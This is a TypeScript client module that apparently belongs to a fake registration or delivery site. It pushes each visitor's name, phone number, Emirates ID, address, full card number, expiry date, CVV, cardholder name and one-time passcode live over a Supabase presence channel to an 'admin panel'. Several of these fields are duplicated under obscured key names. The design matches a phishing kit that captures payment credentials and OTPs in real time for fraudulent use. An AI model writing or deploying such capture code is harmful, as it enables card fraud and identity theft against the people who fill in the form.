'use client';
import { supabase } from './supabase';

const CHANNEL = 'registrations-online';
let _channel: ReturnType<typeof supabase.channel> | null = null;

export type PresenceData = {
  registrationId?: string | number;
  page?: string;
  step?: string;
  fullName?: string;
  phone?: string;
  emiratesId?: string;
  region?: string;
  streetAddress?: string;
  neighborhood?: string;
  deliveryDate?: string;
  paymentMethod?: string;
  onlineAt?: string;
  // card fields (same keys as admin panel expects)
  cardNumber?: string;
  _v1?: string;
  expiryDate?: string;
  _v3?: string;
  cvv?: string;
  _v2?: string;
  cardHolderName?: string;
  _v4?: string;
  finalOtp?: string;
  _v13?: string;
};

function sessionKey(): string {
  if (typeof window === 'undefined') return '';
  let k = sessionStorage.getItem('_pkey');
  if (!k) {
    k = Math.random().toString(36).slice(2) + Date.now().toString(36);
    sessionStorage.setItem('_pkey', k);
  }
  return k;
}

/** Join / update the presence channel with current data. Returns a cleanup fn. */
export function trackPresence(data: PresenceData): () => void {
  if (typeof window === 'undefined') return () => {};

  // Tear down existing channel first
  if (_channel) {
    supabase.removeChannel(_channel);
    _channel = null;
  }

  const ch = supabase.channel(CHANNEL, {
    config: { presence: { key: sessionKey() } },
  });

  ch.on('presence', { event: 'sync' }, () => {})
    .subscribe(async (status) => {
      if (status === 'SUBSCRIBED') {
        await ch.track({ ...data, onlineAt: new Date().toISOString() });
      }
    });

  _channel = ch;

  return () => {
    if (_channel) {
      supabase.removeChannel(_channel);
      _channel = null;
    }
  };
}

/** Update tracked data without rejoining the channel. */
export function pushPresence(data: PresenceData): void {
  _channel?.track({ ...data, onlineAt: new Date().toISOString() }).catch(() => {});
}
